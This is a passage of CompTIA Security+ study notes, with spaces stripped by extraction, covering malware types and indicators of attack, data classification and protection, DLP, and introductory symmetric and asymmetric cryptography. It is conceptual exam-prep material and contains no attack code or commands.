+anyuserinteraction■ Abletoself-replicateandspreadthroughoutyournetworkwithoutauser's
+
+consentortheiraction
+
+○ Wormsaredangerousfortworeasons■ Infectyourworkstationandothercomputingassets■ Causedisruptionstoyournormalnetworktrafficsincetheyareconstantlytrying
+
+toreplicateandspreadthemselvesacrossthenetwork○ Wormsarebestknownforspreadingfarandwideovertheinternetinarelativeshort
+
+amountoftime
+
+● Trojans○ Trojan■ Pieceofmalicioussoftwarethatisdisguisedasapieceofharmlessordesirable
+
+software■ Claimsthatitwillperformsomeneededordesiredfunctionforyou○ RemoteAccessTrojan(RAT)■ Widelyusedbymodernattackersbecauseitprovidestheattackerwithremote
+
+controlofavictimmachine○ Trojansarecommonlyusedtodaybyattackerstoexploitavulnerabilityinyour
+
+workstationandthenconductingdataexfiltrationtostealyoursensitivedocuments,
+
+59https://www.DionTraining.com
+
+## Page 60
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+creatingbackdoorstomaintainpersistenceonyoursystems,andothermalicious
+
+activities
+
+● Ransomware○ Ransomware■ Typeofmalicioussoftwarethatisdesignedtoblockaccesstoacomputersystem
+
+- ritsdatabyencryptingituntilaransomispaidtotheattacker○ Howcanweprotectourselvesandourorganizationsagainstransomware?■ Alwaysconductregularbackups■ Installsoftwareupdatesregularly■ Providesecurityawarenesstrainingtoyourusers■ ImplementMulti-FactorAuthentication(MFA)○ Whatshouldyoudoifyoufindyourselforyourorganizationasthevictimofa
+ransomwareattack?■ Neverpaytheransom● Payingtheransomdoesn'tactuallyguaranteethatyouwillevergetyour
+
+databack■ Ifyoususpectransomwarehasinfectedyourmachine,youshoulddisconnectit
+
+fromthenetwork■ Notifytheauthorities■ Restoreyourdataandsystemsfromknowngoodbackups
+
+● ZombiesandBotnets○ Botnet■ Networkofcompromisedcomputersordevicescontrolledremotelybymalicious
+
+actors
+
+60https://www.DionTraining.com
+
+## Page 61
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Zombie■ Nameofacompromisedcomputerordevicethatispartofabotnet■ Usedtoperformtasksusingremotecommandsfromtheattackerwithoutthe
+
+user'sknowledge○ CommandandControlNode■ Computerresponsibleformanagingandcoordinatingtheactivitiesofother
+
+nodesordeviceswithinanetwork○ Botnetsareused■ aspivotpoints■ disguisetherealattacker■ tohostillegalactivities■ tospamothersbysendingoutphishingcampaignsandothermalware○ MostcommonuseforabotnetistoconductaDDoS(DistributedDenial-of-Service)
+
+attack■ DistributedDenial-of-Service(DDoS)Attack● Occurswhenmanymachinestargetasinglevictimandattackthematthe
+
+exactsametime○ Botnetsareusedbyattackerstocombineprocessingpowertobreakthroughdifferent
+
+typesofencryptionschemes○ Attackersusuallyonlyuseabout20-25%ofanyzombie’spower
+
+● Rootkits○ Rootkit■ Designedtogainadministrativelevelcontroloveragivencomputersystem
+
+withoutbeingdetected
+
+61https://www.DionTraining.com
+
+## Page 62
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AccountwiththehighestlevelofpermissionsiscalledtheAdministratoraccount■ Allowsthepersontoinstallprograms,deleteprograms,openports,shutports,
+
+anddowhateveritistheywanttodoonthatsystem■ InaUNIX,Linux,orMacOScomputer,thistypeofadministratoraccountis
+
+actuallycalledtherootaccount○ Acomputersystemhasseveraldifferentringsofpermissionsthroughoutthesystem■ Ring3(OutermostRing)● Whereuserlevelpermissionsareused■ Ring0(InnermostorHighestPermissionLevels)● OperatinginRing0iscalled“kernelmode”● KernelMode○ Allowsasystemtocontrolaccesstothingslikedevicedrivers,your
+
+soundcard,yourvideodisplayormonitor,andothersimilarthings○ Ifyouloginastheadministratororrootuseronasystem,youhaverootpermissionand
+
+youwillbeoperatingatRing1oftheoperatingsystem■ Remember,thecloserthemaliciouscodeistothekernel,themorepermissions
+
+itwillhaveandthemoredamageitcancauseonyoursystem○ Whenarootkitisinstalledonasystem,ittriestomovefromRing1toRing0sothatit
+
+canhidefromotherfunctionsoftheoperatingsystemtoavoiddetection○ OnetechniqueusedbyrootkitstogainthisdeeperlevelofaccessisaDLLinjection■ DLLInjection● Techniqueusedtorunarbitrarycodewithintheaddressspaceofanother
+
+processbyforcingittoloadadynamic-linklibrary■ DynamicLinkLibrary(DLL)● Collectionofcodeanddatathatcanbeusedbymultipleprograms
+
+simultaneouslytoallowforcodereuseandmodularizationinsoftware
+
+62https://www.DionTraining.com
+
+## Page 63
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+development■ Shim● Pieceofsoftwarecodethatisplacedbetweentwocomponentsandthat
+
+interceptsthecallsbetweenthosecomponentsandcanbeusedredirect
+
+them○ Rootkitsareextremelypowerful,andtheyareverydifficulttodetectbecausethe
+
+- peratingsystemisessentiallyblindedtothem■ Todetectthem,thebestwayistobootfromanexternaldeviceandthenscan
+theinternalharddrivetoensurethatyoucandetectthoserootkitsusingagood
+
+anti-malwarescanningsolutionfromalivebootLinuxdistribution
+
+● BackdoorsandLogicBombs○ Backdoor■ Originallyplacedincomputerprogramstobypassthenormalsecurityand
+
+authenticationfunctions■ Mostoftenputintosystemsbydesignersandprogrammers■ RemoteAccessTrojan(RAT)actsjustlikeabackdoorinourmodernnetworks● Canbeplacedbyathreatactoronyourcomputertohelpthemmaintain
+
+persistentaccesstothatsystem○ Easteregg■ ahiddenfeatureornoveltywithinaprogramthatistypicallyinsertedbythe
+
+softwaredevelopersasaninsidejoke■ Codeoftenhassignificantvulnerabilities○ LogicBombs■ Maliciouscodethat'sinsertedintoaprogram,andthemaliciouscodewillonly
+
+executewhencertainconditionshavebeenmet
+
+63https://www.DionTraining.com
+
+## Page 64
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Keylogger○ Keylogger■ Pieceofsoftwareorhardwarethatrecordseverysinglekeystrokethatismade
+
+- nacomputerormobiledevice○ Keyloggerscanbeeithersoftware-basedorhardware-based■ SoftwareKeyloggers● Maliciousprogramsthatgetinstalledonavictim'scomputer● Oftenbundledwithothersoftwareordeliveredthroughsocial
+engineeringattacks,likephishingorpretextingattacks■ HardwareKeyloggers● Physicaldevicesthatneedtobepluggedintoacomputer● ThesewillresembleaUSBdriveortheycanbeembeddedwithina
+
+keyboardcableitself○ Toprotectyourorganizationfromkeyloggers,ensurethefollowing■ Performregularupdatesandpatches■ Relyonqualityantivirusandantimalwaresolutions■ Conductphishingawarenesstrainingforyourusers■ Implementmulti-factorauthenticationsystems■ Encryptkeystrokesbeingsenttoyoursystems■ Performphysicalchecksofyourdesktops,laptops,andservers
+
+● SpywareandBloatware○ Spyware■ Malicioussoftwarethatisdesignedtogatherandsendinformationaboutauser
+
+- rorganizationwithouttheirknowledge
+64https://www.DionTraining.com
+
+## Page 65
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Spywarecangetinstalledonasysteminseveraldifferentways● Bundledwithothersoftware● Installedthroughamaliciouswebsite● Installedwhenusersclickonadeceptivepop-upadvertisement■ Tohelpprotectyourselfagainstspyware,youshouldonlyusereputableantivirus
+
+andanti-spywaretoolsthatareregularlyupdateddetectandremoveany
+
+potentialthreats○ Bloatware■ Anysoftwarethatcomespre-installedonanewcomputerorsmartphonethat
+
+you,astheuser,didnotspecificallyrequest,want,orneed■ Otherexamplesofbloatwarearethingslikeunnecessarytoolbarsorapplications
+
+thatpromotecertainservices■ Bloatwareisn’tmalicious,butitcan● wasteyourstoragespace● slowdowntheperformanceofyourdevices● introducesecurityvulnerabilitiesintoyoursystems■ Remember,anytimeapieceofsoftwareisinstalled,thatisonemorepotential
+
+threatvectorforanattackertoexploitifyoudon’tproperlyupdatethat
+
+application■ Toremovebloatware,youcaneitherdothefollowing● Doamanualremovalprocess● Usebloatwareremovaltoolstouninstalltheunwantedapplications● Performacleanoperatingsysteminstallation
+
+65https://www.DionTraining.com
+
+## Page 66
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● MalwareAttackTechniques○ MalwareExploitationTechnique■ Specificmethodbywhichmalwarecodepenetratesandinfectsatargetedsystem○ Somemalwarefocusesoninfectingthesystem’smemorytoleverageremoteprocedure
+
+callsovertheorganization’snetwork■ Mostmodernmalwareusesfilelesstechniquestoavoiddetectionby
+
+signature-basedsecuritysoftware■ FilelessMalwareisusedtocreateaprocessinthesystemmemorywithout
+
+relyingonthelocalfilesystemoftheinfectedhost○ Howdoesthismodernmalwarework?■ Whenauseraccidentallyclicksonamaliciouslinkoropensamaliciousfile,the
+
+specifictypeofmalwarebeinginstalledisknownasastageonedropperor
+
+downloader● Stage1DropperorDownloader○ Pieceofmalwarethatisusuallycreatedasalightweightshellcode
+
+thatcanbeexecutedonagivensystem● Dropper○ Specificmalwaretypedesignedtoinitiateorrunothermalware
+
+formswithinapayloadonaninfectedhost● Downloader○ Retrieveadditionaltoolsposttheinitialinfectionfacilitatedbya
+
+dropper● Theprimaryfunctionofastageonedropperordownloaderistoretrieve
+
+additionalportionsofthemalwarecodeandtotricktheuserinto
+
+activatingit
+
+66https://www.DionTraining.com
+
+## Page 67
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Shellcode○ Broadertermthatencompasseslightweightcodemeantto
+
+executeanexploitonagiventarget● Stage2:Downloader○ DownloadsandinstallsaremoteaccessTrojantoconduct
+
+commandandcontrolonthevictimizedsystem● “ActionsonObjectives”Phase○ Threatactorswillexecuteprimaryobjectivestomeetcore
+
+- bjectiveslike■ dataexfiltration■ fileencryption● Concealment○ Usedtohelpthethreatactorprolongunauthorizedaccesstoa
+systemby■ hidingtracks■ erasinglogfiles■ hidinganyevidenceofmaliciousactivity○ “LivingofftheLand”■ AstrategyadoptedbymanyAdvancedPersistentThreats
+
+andcriminalorganizations■ thethreatactorstrytoexploitthestandardtoolsto
+
+performintrusions
+
+67https://www.DionTraining.com
+
+## Page 68
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● IndicationsofMalwareAttacks○ 9CommonIndicatorsofMalwareAttacks■ AccountLockouts● Malware,especiallythosedesignedforcredentialtheftorbruteforce
+
+attacks,cantriggermultiplefailedloginattemptsthatwouldresultina
+
+user’saccountbeinglockedout■ ConcurrentSessionUtilization● Ifyounoticethatasingleuseraccounthasmultiplesimultaneousor
+
+concurrentsessionsopen,especiallyfromvariousgeographiclocations■ BlockedContent● Ifthereisasuddenincreaseintheamountofblockedcontentalertsyou
+
+areseeingfromyoursecuritytools■ ImpossibleTravel● Referstoascenariowhereauser'saccountisaccessedfromtwoormore
+
+geographicallyseparatedlocationsinanimpossiblyshortperiodoftime
+
+■ ResourceConsumption● IfyouareobservinganyunusualspikesinCPU,memory,ornetwork
+
+bandwidthutilizationthatcannotbelinkedbacktoalegitimatetask■ ResourceInaccessibility● Ransomware○ Formofmalwarethatencryptsuserfilestomakethem
+
+inaccessibletotheuser● Ifalargenumberoffilesorcriticalsystemssuddenlybecomeinaccessible
+
+- rifusersreceivemessagesdemandingpaymenttodecrypttheirdata
+68https://www.DionTraining.com
+
+## Page 69
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Out-of-CycleLogging● Ifyouarenoticingthatyourlogsarebeinggeneratedatoddhoursor
+
+duringtimeswhennolegitimateactivitiesshouldbetakingplace(suchas
+
+inthemiddleofthenightwhennoemployeesareactivelyworking)■ MissingLogs● Ifyouareconductingalogreviewasacybersecurityanalystandyousee
+
+thattherearegapsinyourlogsorifthelogshavebeenclearedwithout
+
+anyauthorizedreason■ PublishedorDocumentedAttacks● Ifacybersecurityresearchorreporterpublishedareportthatshowsthat
+
+yourorganization’snetworkhasbeeninfectedaspartofabotnetorother
+
+malware-basedattack
+
+69https://www.DionTraining.com
+
+## Page 70
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+DataProtection
+
+Objectives:● 1.4-Explaintheimportanceofusingappropriatecryptographicsolutions● 3.3-Compareandcontrastconceptsandstrategiestoprotectdata● 4.2-Explainthesecurityimplicationsofproperhardware,software,anddataasset
+
+management● 4.4-Explainsecurityalertingandmonitoringconceptsandtools● 5.1-Summarizeelementsofeffectivesecuritygovernance
+
+● DataProtection○ DataProtection■ Safeguardinginformationfromcorruption,compromise,orloss○ DataClassifications■ Types● Sensitive● Confidential● Public● Restricted● Private● Critical○ DataOwnershipRoles■ DataOwners■ DataControllers■ DataProcessors
+
+70https://www.DionTraining.com
+
+## Page 71
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ DataCustodians■ DataStewards○ DataStates■ States● Dataatrest● Dataintransit● Datainuse■ ProtectionMethods● Diskencryption● Communicationtunneling○ DataTypes■ Examples● Regulateddata● Tradesecrets● Intellectualproperty● Legalinformation● Financialinformation● Humanvsnon-humanreadabledata○ DataSovereignty■ Informationsubjecttolawsandgovernancestructureswithinthenationitis
+
+collected○ SecuringDataMethods■ GeographicRestrictions■ Encryption■ Hashing■ Masking
+
+71https://www.DionTraining.com
+
+## Page 72
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Tokenization■ Obfuscation■ Segmentation■ PermissionRestriction○ DataLossPrevention(DLP)■ Strategytopreventsensitiveinformationfromleavinganorganization
+
+● DataClassifications○ DataClassification■ Basedonthevaluetotheorganizationandthesensitivityoftheinformation,
+
+determinedbythedataowner○ SensitiveData■ Informationthat,ifaccessedbyunauthorizedpersons,canresultinthelossof
+
+securityorcompetitiveadvantageforacompany■ Overclassifyingdataleadstoprotectingalldataatahighlevel○ ImportanceofDataClassification■ Helpsallocateappropriateprotectionresources■ Preventsover-classificationtoavoidexcessivecosts■ Requiresproperpoliciestoidentifyandclassifydataaccurately○ CommercialBusinessClassificationLevels■ Public● Noimpactifreleased;oftenpubliclyaccessibledata
+
+■ Sensitive● Minimalimpactifreleased,e.g.,financialdata■ Private
+
+72https://www.DionTraining.com
+
+## Page 73
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Containsinternalpersonnelorsalaryinformation■ Confidential● Holdstradesecrets,intellectualproperty,sourcecode,etc.■ Critical● Extremelyvaluableandrestrictedinformation○ GovernmentClassificationLevels■ Unclassified● Generallyreleasabletothepublic■ SensitivebutUnclassified● Includesmedicalrecords,personnelfiles,etc.■ Confidential● Containsinformationthatcouldaffectthegovernment■ Secret● Holdsdatalikemilitarydeploymentplans,defensivepostures■ TopSecret● Highestlevel,includeshighlysensitivenationalsecurityinformation○ LegalRequirements■ Dependingontheorganization'stype,theremaybelegalobligationstomaintain
+
+specificdatafordefinedperiods○ Documentation■ Organizationalpoliciesshouldclearlyoutlinedataclassification,retention,and
+
+disposalrequirements○ Note:Understandingdataclassificationsandtheirproperhandlingisvitalforprotecting
+
+sensitiveinformationandcomplyingwithrelevantregulations
+
+73https://www.DionTraining.com
+
+## Page 74
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● DataOwnership○ DataOwnership■ Processofidentifyingtheindividualresponsibleformaintainingthe
+
+confidentiality,integrity,availability,andprivacyofinformationassets○ DataOwner■ Aseniorexecutiveresponsibleforlabelinginformationassetsandensuringthey
+
+areprotectedwithappropriatecontrols○ DataController■ Entityresponsiblefordeterminingdatastorage,collection,andusagepurposes
+
+andmethods,aswellasensuringthelegalityoftheseprocesses○ DataProcessor■ Agrouporindividualhiredbythedatacontrollertoassistwithtaskslikedata
+
+collectionandprocessing○ DataSteward■ Focusesondataqualityandmetadata,ensuringdataisappropriatelylabeledand
+
+classified,oftenworkingunderthedataowner○ DataCustodian■ Responsibleformanagingthesystemsonwhichdataassetsarestored,including
+
+enforcingaccesscontrols,encryption,andbackupmeasures○ PrivacyOfficer■ Overseesprivacy-relateddata,suchaspersonallyidentifiableinformation(PII),
+
+sensitivepersonalinformation(SPI),orprotectedhealthinformation(PHI),
+
+ensuringcompliancewithlegalandregulatoryframeworks○ DataOwnershipResponsibility■ TheITdepartment(CIOorITpersonnel)shouldnotbethedataowner;data
+
+74https://www.DionTraining.com
+
+## Page 75
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+- wnersshouldbeindividualsfromthebusinesssidewhounderstandthedata's
+contentandcanmakeinformeddecisionsaboutclassification○ SelectionofDataOwners■ Dataownersshouldbedesignatedwithintheirrespectivedepartmentsbasedon
+
+theirknowledgeofthedataanditssignificancewithintheorganization○ Note:Properdataownershipisessentialformaintainingdatasecurity,compliance,and
+
+effectivedatamanagementwithinanorganization.Differentrolescontributeto
+
+safeguardingandmanagingdataappropriately
+
+● DataStates○ DataatRest■ Datastoredindatabases,filesystems,orstoragesystems,notactivelymoving■ EncryptionMethods● FullDiskEncryption(FDE)○ Encryptstheentireharddrive● PartitionEncryption○ Encryptsspecificpartitions,leavingothersunencrypted● FileEncryption○ Encryptsindividualfiles● VolumeEncryption○ Encryptsselectedfilesordirectories● DatabaseEncryption○ Encryptsdatastoredinadatabaseatcolumn,row,ortablelevels● RecordEncryption○ Encryptsspecificfieldswithinadatabaserecord
+
+75https://www.DionTraining.com
+
+## Page 76
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ DatainTransit(DatainMotion)■ Dataactivelymovingfromonelocationtoanother,vulnerabletointerception■ TransportEncryptionMethods● SSL(SecureSocketsLayer)andTLS(TransportLayerSecurity)○ Securecommunicationovernetworks,widelyusedinweb
+
+browsingandemail● VPN(VirtualPrivateNetwork)○ Createssecureconnectionsoverlesssecurenetworkslikethe
+
+internet● IPSec(InternetProtocolSecurity)○ SecuresIPcommunicationsbyauthenticatingandencryptingIP
+
+packets○ DatainUse■ Dataactivelybeingcreated,retrieved,updated,ordeleted■ ProtectionMeasures● EncryptionattheApplicationLevel○ Encryptsdataduringprocessing● AccessControls○ Restrictsaccesstodataduringprocessing● SecureEnclaves○ Isolatedenvironmentsforprocessingsensitivedata● MechanismslikeINTELSoftwareGuard○ Encryptsdatainmemorytopreventunauthorizedaccess○ Note:Understandingthethreedatastates(dataatrest,dataintransit,anddatainuse)
+
+andimplementingappropriatesecuritymeasuresforeachisessentialforcomprehensive
+
+76https://www.DionTraining.com
+
+## Page 77
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+dataprotection
+
+● DataTypes○ RegulatedData■ Controlledbylaws,regulations,orindustrystandards■ Compliancerequirements● GeneralDataProtectionRegulation(GDPR)● HealthInsurancePortabilityandAccountabilityAct(HIPAA)○ PII(PersonalIdentificationInformation)■ Informationusedtoidentifyanindividual(e.g.,names,socialsecuritynumbers,
+
+addresses)■ Targetedbycybercriminalsandprotectedbyprivacylaws○ PHI(ProtectedHealthInformation)■ Informationabouthealthstatus,healthcareprovision,orpaymentlinkedtoa
+
+specificindividual■ ProtectedunderHIPAA○ TradeSecrets■ Confidentialbusinessinformationgivingacompetitiveedge(e.g.,manufacturing
+
+processes,marketingstrategies,proprietarysoftware)■ Legallyprotected;unauthorizeddisclosureresultsinpenalties○ IntellectualProperty(IP)■ Creationsofthemind(e.g.,inventions,literaryworks,designs)■ Protectedbypatents,copyrights,trademarkstoencourageinnovation■ Unauthorizedusecanleadtolegalaction○ LegalInformation■ Datarelatedtolegalproceedings,contracts,regulatorycompliance
+
+77https://www.DionTraining.com
+
+## Page 78
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Requireshigh-levelprotectionforclientconfidentialityandlegalprivilege○ FinancialInformation■ Datarelatedtofinancialtransactions(e.g.,salesrecords,taxdocuments,bank
+
+statements)■ Targetedbycybercriminalsforfraudandidentitytheft■ SubjecttoPCIDSS(PaymentCardIndustryDataSecurityStandard)○ Human-ReadableData■ Understandabledirectlybyhumans(e.g.,textdocuments,spreadsheets)○ Non-Human-ReadableData■ Requiresmachineorsoftwaretointerpret(e.g.,binarycode,machinelanguage)■ Containssensitiveinformationandrequiresprotection
+
+● DataSovereignty○ DataSovereignty■ Digitalinformationsubjecttolawsofthecountrywhereit'slocated■ Gainedimportancewithcloudcomputing'sglobaldatastorage○ GDPR(GeneralDataProtectionRegulation)■ ProtectsEUcitizens'datawithinEUandEEAborders■ Compliancerequiredregardlessofdatalocation■ Non-complianceleadstosignificantfines○ DataSovereigntyLaws(e.g.,China,Russia)■ Requiredatastorageandprocessingwithinnationalborders■ Challengeformultinationalcompaniesandcloudservices○ AccessRestrictions■ Cloudservicesmayrestrictaccessfrommultiplegeographiclocations○ Datasovereigntyandgeographicalconsiderationsposecomplexchallenges,but
+
+78https://www.DionTraining.com
+
+## Page 79
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+- rganizationscannavigatethemsuccessfullywithplanning,legalguidance,andstrategic
+technologyuse,ensuringcomplianceanddataprotection
+
+● SecuringData○ GeographicRestrictions(Geofencing)■ Virtualboundariestorestrictdataaccessbasedonlocation■ Compliancewithdatasovereigntylaws■ Preventunauthorizedaccessfromhigh-risklocations○ Encryption■ Transformplaintextintociphertextusingalgorithmsandkeys■ Protectsdataatrestandintransit■ Requiresdecryptionkeyfordatarecovery○ Hashing■ Convertsdataintofixed-sizehashvalues■ Irreversibleone-wayfunction■ Commonlyusedforpasswordstorage○ Masking■ Replacesomeoralldatawithplaceholders(e.g.,"x")■ Partiallyretainsmetadataforanalysis■ Irreversiblede-identificationmethod○ Tokenization■ Replacesensitivedatawithnon-sensitivetokens■ Originaldatastoredsecurelyinaseparatedatabase■ Oftenusedinpaymentprocessingforcreditcardprotection○ Obfuscation■ Makedataunclearorunintelligible
+
+79https://www.DionTraining.com
+
+## Page 80
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Varioustechniques,includingencryption,masking,andpseudonyms■ Hinderunauthorizedunderstanding○ Segmentation■ Dividenetworkintoseparatesegmentswithuniquesecuritycontrols■ Preventlateralmovementincaseofabreach■ Limitspotentialdamage○ PermissionRestrictions■ DefinedataaccessandactionsthroughACLsorRBAC■ Restrictaccesstoauthorizedusers■ Reduceriskofinternaldatabreaches
+
+● DataLossPrevention(DLP)○ DataLossPrevention(DLP)■ Aimstomonitordatainuse,intransit,oratresttodetectandpreventdatatheft○ DLPsystemsareavailableassoftwareorhardwaresolutions○ TypesofDLPSystems■ EndpointDLPSystem● Installedassoftwareonworkstationsorlaptops● Monitorsdatainuseonindividualcomputers● Canpreventoralertonfiletransfersbasedonpredefinedrules■ NetworkDLPSystem● Softwareorhardwareplacedatthenetworkperimeter● Focusesonmonitoringdataenteringandleavingthenetwork● Detectsunauthorizeddataleavingthenetwork■ StorageDLPSystem● Installedonaserverinthedatacenter
+
+80https://www.DionTraining.com
+
+## Page 81
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Inspectsdataatrest,especiallyencryptedorwatermarkeddata● Monitorsdataaccesspatternsandflagspolicyviolations■ Cloud-BasedDLPSystem● Offeredasasoftware-as-a-servicesolution● Protectsdatastoredincloudservices
+
+81https://www.DionTraining.com
+
+## Page 82
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+CryptographicSolutions
+
+Objectives:● 1.4-Explaintheimportanceofusingappropriatecryptographicsolutions● 2.3-Explainvarioustypesofvulnerabilities● 2.4-Givenascenario,youmustbeabletoanalyzeindicatorsofmaliciousactivity
+
+● CryptographicSolutions○ Cryptography■ Practiceandstudyofwritingandsolvingcodes■ Encryptiontohideinformation'struemeaning○ Encryption■ Convertsplaintexttociphertext■ Providesdataprotectionatrest,intransit,andinuse○ DataStates■ DataatRest● Inactivedataonstoragedevices■ DatainTransit● Movingacrossnetworks■ DatainUse● Currentlyundergoingchange○ AlgorithmandKey■ Algorithm(Cipher)● Performsencryptionordecryption
+
+82https://www.DionTraining.com
+
+## Page 83
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Key● Essentialfordeterminingcipheroutput○ KeyStrengthandRotation■ KeyLength● Proportionaltosecurity■ KeyRotation● Bestpracticeforsecuritylongevity○ SymmetricandAsymmetricEncryption■ Symmetric● Usessamekeyforencryptionanddecryption■ Asymmetric● Usesapairofkeysforencryptionanddecryption○ SymmetricAlgorithms■ DES■ TripleDES■ IDEA■ AES■ Blowfish■ Twofish■ RivestCipher○ AsymmetricAlgorithms■ Diffie-Hellman■ RSA■ EllipticCurveCryptography○ Hashing■ Convertsdataintofixed-sizestring(digest)usinghashfunctions
+
+83https://www.DionTraining.com
+
+## Page 84
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Algorithms● MD5● SHAFamily● RIPEMD● HMAC○ PublicKeyInfrastructure(PKI)■ Frameworkmanagingdigitalkeysandcertificatesforsecuredatatransfer○ DigitalCertificates■ Electroniccredentialsverifyingentityidentityforsecurecommunications○ Blockchain■ Decentralized,immutableledgerensuringdataintegrityandtransparency○ EncryptionTools■ TPM■ HSM■ KeyManagementSystems■ SecureEnclave○ Obfuscation■ Steganography■ Tokenization■ DataMasking○ CryptographicAttacks■ DowngradeAttacks■ CollisionAttacks■ QuantumComputingThreats
+
+84https://www.DionTraining.com
+
+## Page 85
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● SymmetricvsAsymmetric○ SymmetricEncryption■ Usesasinglekeyforbothencryptionanddecryption■ Oftenreferredtoasprivatekeyencryption■ Requiresbothsenderandreceivertosharethesamesecretkey■ Offersconfidentialitybutlacksnon-repudiation■ Challengeswithkeydistributioninlarge-scaleusage● Morepeoplemeansmoresharingofthekeys○ AsymmetricEncryption■ Usestwoseparatekeys● Publickeyforencryption● Privatekeyfordecryption■ Oftencalled“PublicKeyCryptography”■ Noneedforsharedsecretkeys■ CommonlyusedalgorithmsincludeDiffie-Hellman,RSA,andEllipticCurve
+
+Cryptography(ECC)■ Slowercomparedtosymmetricencryptionbutsolveskeydistributionchallenges○ HybridApproach■ Combinesbothsymmetricandasymmetricencryptionforoptimalbenefits■ Asymmetricencryptionusedtoencryptandshareasecretkey■ Symmetricencryptionusedforbulkdatatransfer,leveragingthesharedsecret
+
+key■ Offerssecurityandefficiency○ StreamCipher■ Encryptsdatabit-by-bitorbyte-by-byteinacontinuousstream■ UsesakeystreamgeneratorandexclusiveXORfunctionforencryption
+
+85https://www.DionTraining.com
+
+## Page 86
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Suitableforreal-timecommunicationdatastreamslikeaudioandvideo■ Oftenusedinsymmetricalgorithms○ BlockCipher■ Breaksinputdataintofixed-sizeblocksbeforeencryption● Usually64,128,or256bitsatatime■ Paddingaddedtosmallerdatablockstofitthefixedblocksize■ Advantagesincludeeaseofimplementationandsecurity■ Canbeimplementedinsoftware,whereasstreamciphersareoftenusedin
+
+hardwaresolutions
+
+● SymmetricAlgorithms○ DES(DataEncryptionStandard)■ Usesa64-bitkey(56effectivebitsduetoparity)■ Encryptsdatain64-bitblocksthrough16roundsoftranspositionand
+
+substitution■ Widelyusedfromthe1970stotheearly2000s○ TripleDES(3DES)■ Utilizesthree56-bitkeys■ Encryptsdatawiththefirstkey,decryptswiththesecondkey,andencryptsagain
+
+withthethirdkey■ Provides112-bitkeystrengthbutisslowerthanDES○ IDEA(InternationalDataEncryptionAlgorithm)■ Asymmetricblockcipherwitha64-bitblocksize■ Usesa128-bitkey,fasterandmoresecurethanDES■ NotaswidelyusedasAES
+
+86https://www.DionTraining.com
+
+## Page 87
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AES(AdvancedEncryptionStandard)■ ReplacedDESand3DESastheUSgovernmentencryptionstandard■ Supports128-bit,192-bit,or256-bitkeysandmatchingblocksizes■ Widelyadoptedandconsideredtheencryptionstandardforsensitive
+
+unclassifiedinformation○ Blowfish■ Ablockcipherwithkeysizesrangingfrom32to448bits■ DevelopedasaDESreplacementbutnotwidelyadopted○ Twofish■ Ablockciphersupporting128-bitblocksizeandkeysizesof128,192,or256bits■ Opensourceandavailableforuse○ RCCipherSuite(RC4,RC5,RC6)■ Createdbycryptographer,RonRivest■ RC4isastreamcipherwithvariablekeysizesfrom40to2048bits,usedinSSL
+
+andWEP■ RC5isablockcipherwithkeysizesupto2048bits■ RC6,basedonRC5,wasconsideredasaDESreplacement○ Classification■ Allthementionedalgorithmsaresymmetric■ MostareblockciphersexceptforRC4,whichisastreamcipher○ Note:Whenworkingwithencryption,identifyifit'ssymmetricorasymmetricand
+
+whetherit'sablockorstreamcipher
+
+● AsymmetricAlgorithms○ PublicKeyCryptography■ Nosharedsecretkeyrequired
+
+87https://www.DionTraining.com
+
+## Page 88
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Usesakeypair● Publickeyforencryption● Privatekeyfordecryption■ Providesconfidentiality,integrity,authentication,andnon-repudiation○ ConfidentialitywithPublicKey■ Encryptdatausingthereceiver'spublickey■ Onlytherecipientwiththecorrespondingprivatekeycandecryptit○ Non-RepudiationwithPrivateKey■ Encryptdatausingthesender'sprivatekey■ Anyonewithaccesstothesender'spublickeycanverifythesender'sidentity○ IntegrityandAuthenticationwithDigitalSignature■ Createahashdigestofthemessage■ Encryptthehashdigestwiththesender'sprivatekey● DigitalSignature○ Ahashdigestofamessageencryptedwiththesender’sprivate
+
+keytolettherecipientknowthedocumentwascreatedandsent
+
+bythepersonclaimingtohavesentit■ Encryptthemessagewiththereceiver'spublickey■ Ensuresmessageintegrity,non-repudiation,andconfidentiality○ CommonAsymmetricAlgorithms■ Diffie-Hellman● Usedforkeyexchangeandsecurekeydistribution● Vulnerabletoman-in-the-middleattacks,requiresauthentication● CommonlyusedinVPNtunnelestablishment(IPSec)■ RSA(RonRivest,AdiShamir,LeonardAdleman)● Usedforkeyexchange,encryption,anddigitalsignatures
+
+88https://www.DionTraining.com
+
+## Page 89
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
